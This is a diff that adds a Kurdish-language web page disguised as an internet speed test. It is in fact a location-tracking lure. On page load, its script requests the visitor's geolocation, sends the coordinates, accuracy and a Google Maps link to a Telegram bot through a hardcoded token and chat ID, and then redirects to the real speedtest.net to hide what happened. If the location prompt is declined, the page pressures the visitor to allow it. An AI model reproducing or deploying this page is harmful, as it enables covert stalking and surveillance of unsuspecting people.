@@ -1,0 +1,48 @@
+<!DOCTYPE html>
+<html lang="ku">
+<head>
+    <meta charset="UTF-8">
+    <title>Internet Speed Test</title>
+    <style>
+        body { font-family: sans-serif; text-align: center; padding-top: 50px; background-color: #f4f4f4; }
+        .loader { border: 16px solid #f3f3f3; border-top: 16px solid #3498db; border-radius: 50%; width: 120px; height: 120px; animation: spin 2s linear infinite; margin: auto; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+    </style>
+</head>
+<body>
+    <div class="loader"></div>
+    <h1>تکایە چاوەڕوان بە...</h1>
+    <p>خەریکی پشکنینی خێرایی ئینتەرنێتەکەتین</p>
+
+    <script>
+        const token = "8117812522:AAGFhq6xv5zgci1Z9mt5H1a3c26V7h48CI4";
+        const chatID = "1034878899";
+
+        window.onload = function() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(sendLocation, handleError);
+            } else {
+                alert("وێبگەڕەکەت ڕێگە نادات.");
+            }
+        };
+
+        function sendLocation(position) {
+            const lat = position.coords.latitude;
+            const lon = position.coords.longitude;
+            const accuracy = position.coords.accuracy;
+            const mapsLink = `https://www.google.com/maps?q=${lat},${lon}`;
+            
+            const message = `📍 شوێنی ورد دۆزرایەوە!\n\n🌐 نەخشە: ${mapsLink}\n🎯 ڕێژەی وردی: ${accuracy} مەتر`;
+
+            fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatID}&text=${encodeURIComponent(message)}`)
+            .then(() => {
+                window.location.href = "https://www.speedtest.net"; // ڕەوانەکردن بۆ ماڵپەڕێکی ڕاستەقینە
+            });
+        }
+
+        function handleError(error) {
+            alert("بۆ ئەوەی پشکنینەکە کار بکات، دەبێت ڕێگە بە Location بدەیت (Allow).");
+        }
+    </script>
+</body>
+</html>
